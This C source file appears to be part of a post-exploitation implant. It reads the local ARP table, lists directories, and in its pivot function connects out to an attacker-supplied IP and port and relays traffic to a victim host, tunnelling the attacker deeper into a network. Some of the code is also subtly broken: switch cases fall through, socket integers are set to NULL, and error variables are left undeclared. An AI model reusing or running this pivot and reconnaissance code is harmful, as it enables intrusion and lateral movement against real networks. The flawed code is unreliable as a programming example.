#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <dirent.h>
#include "commands.h"
#include "dbg.h"
#include <errno.h>
#include <netdb.h>
#include <strings.h>
#include <unistd.h>

ArpResult* get_arp(char *argv,int argc)
{
    char line[500];                         // create a temporary line with 500 bytes limit
    struct ArpTag *out, *temp;              // declare two pointer variables which is defined by the arp tag structure
    struct ArpResult result;         // declare a memory static variable which is defined by the arp result structure
    FILE *fp = fopen("/proc/net/arp", "r"); // get a file pointer to arp table pseudo file
    fgets(line, sizeof(line), fp);          // Skip the first line (column headers).
    out = malloc(sizeof(ArpTag));           // allocate memory equal to the size of the arp tag
    unsigned int count = 0;                          // declare the entries counter variable
    bool firstrun = true;                   // define the first run variable for the loop below
    while(fgets(line, sizeof(line), fp))    // iterate through each line of the arp table
    {
        if(!firstrun)                       // check if this is the first run of the loop
        {
            temp=realloc(out,(sizeof(ArpTag)*(count+1)));   // if its not then reallocate memory to the previous created buffer equal to the size of arp tag multiplied to the contents of the count variable plus one
            if ( temp != NULL )                             // if the result of the reallocation is not null
            {
                out=temp;                                   // set the pointer variable out to the pointer of the reallocated buffer
            }
            else
            {
                printf("Error allocating memory!\n");       // if the reallocation was failed the print an error message
                exit(1);                                    // and exit with error
            }
        }

        // Read the data.
        sscanf(line, "%s 0x%x 0x%x %s %s %s\n",         // scan structed the contents of line
               (out[count]).ip_address,
               &(out[count]).hw_type,
               &(out[count]).flags,
               (out[count]).mac_address,
               (out[count]).mask,
               (out[count]).device);
        count++;
        firstrun = false;
    }
    fclose(fp);
    result.result = out;
    result.counter = count;
    ArpResult *out_result = malloc(sizeof(ArpResult));
    memcpy(out_result,&result,sizeof(ArpResult));
    return out_result;
}


int free_str_array(struct StringArray *array){
    if(array == NULL){
        return -1;
    }
    if(array->count == 0 || array->strings == NULL){
        free(array);
        return 0;
    }
    for(int firstIterate = 0;firstIterate < array->count;firstIterate++){
        if (array->strings[firstIterate].string != NULL) {
            free(array->strings[firstIterate].string);
        }
    }
    free(array->strings);
    free(array);
    return 0;
}


struct StringArray * get_dir_list(char *argv,int argc){
    DIR *d = NULL;
    struct StringArray *err;

    if(argc == 0){
        //get current direcotry
        d = opendir(".");
    }
    else if(argc == 1)
    {
        d = opendir(argv);
        check_dir_open(d);
    }
    else
    {
        return NULL;
    }
    struct StringArray *out = malloc(sizeof(struct StringArray));
    check_mem(out);
    struct dirent *dir;
    unsigned int count = 0;
    struct String *temp;
    out->strings = malloc(sizeof(struct String));
    check_mem(out->strings);
    bool firstrun = true;
    if (d)
    {
        out->count = 0;
        while ((dir = readdir(d)) != NULL)
        {
            if(!firstrun){
                temp = realloc(out->strings,sizeof(struct String)*(count+1));
                check_mem(temp);
                out->strings = temp;
            }
            size_t dirlen = strlen(dir->d_name);
            out->strings[count].string = malloc(sizeof(char)*(dirlen+1));
            check_mem(out->strings[count].string);
            strcpy(out->strings[count].string,dir->d_name);
            out->strings[count].length = (size_t) dirlen;
            count++;
            out->count++;
            firstrun = false;
        }
        closedir(d);
    }
    return out;

    error:
        if(error_code) {
            switch (error_code) {
                case ENOTDIR:
                    error_message = strerror(ENOTDIR);
                case ENOENT:
                    error_message = strerror(ENOENT);
                default:
                    if (!error_message) break;
                    error_message_len = strlen(error_message);
                    check_mem(err = malloc(sizeof(struct StringArray)));
                    check_mem(err->strings = malloc(sizeof(struct String)));
                    err->count = 1;
                    check_mem(err->strings[0].string = malloc(sizeof(char) * (error_message_len + 1)));
                    strcpy(err->strings[0].string, error_message);
                    err->strings[0].length = (size_t) error_message_len;
                    return err;
            }
        }
        free_str_array(out);
        set_zero_errno();
        return NULL;
}

int pivot(struct PivotInput *input) {
    ssize_t n;
    int attacker_sockfd, target_sockfd;
    struct sockaddr_in attacker_server_address, target_server_address;
    attacker_sockfd = NULL;
    target_sockfd = NULL;
    char buffer[BUFFER_SIZE];
    attacker_sockfd = socket(AF_INET, SOCK_STREAM,0);
    if(attacker_sockfd < 0){
        log_err("Attacker socket open failure");
        set_zero_errno();
        goto error;
    }

    attacker_server_address.sin_family = AF_INET;
    bcopy((char *) &input->atk_ip.s_addr, (char *) &attacker_server_address.sin_addr.s_addr, sizeof(input->atk_ip.s_addr));
    attacker_server_address.sin_port = input->atk_port;
    if(connect(attacker_sockfd,(struct sockaddr *) &attacker_server_address, sizeof(attacker_server_address)) < 0){
        log_err("Error connecting to attacker");
        set_zero_errno();
        goto error;
    }
    target_sockfd = socket(AF_INET, SOCK_STREAM,0);
    if(target_sockfd < 0){
        log_err("Target socket open failure");
        set_zero_errno();
        goto error;
    }
    target_server_address.sin_family = AF_INET;
    bcopy((char *) &input->vktm_ip.s_addr, (char *) &target_server_address.sin_addr.s_addr, sizeof(input->vktm_ip.s_addr));
    target_server_address.sin_port = input->vktm_port;
    if(connect(target_sockfd,(struct sockaddr *) &target_server_address,sizeof(target_server_address)) < 0){
        log_err("Error connecting to target");
        set_zero_errno();
        goto error;
    }

    while(true){
        bzero(buffer,BUFFER_SIZE);
        n = read(attacker_sockfd,&buffer,(BUFFER_SIZE-1));
        if(n < 0){
            log_err("Broken pipe (attacker)");
            set_zero_errno();
            goto error;
        }
        if(strcmp(&buffer,"exit") == 0){
            break;
        }
        n = write(target_sockfd,&buffer,BUFFER_SIZE);
        if(n < 0){
            log_err("Broken pipe (target)");
            set_zero_errno();
            goto error;
        }
        bzero(buffer,BUFFER_SIZE);
        n = read(target_sockfd,&buffer,(BUFFER_SIZE-1));
        if(n < 0){
            log_err("Broken pipe (attacker)");
            set_zero_errno();
            goto error;
        }
        n = write(attacker_sockfd,&buffer,BUFFER_SIZE);
        if(n < 0){
            log_err("Broken pipe (target)");
            set_zero_errno();
            goto error;
        }
    }

    if (attacker_sockfd) close(attacker_sockfd);
    if (target_sockfd) close(target_sockfd);

    return 0;

    error:
        if (attacker_sockfd) close(attacker_sockfd);
        if (target_sockfd) close(target_sockfd);
        return -1;
}
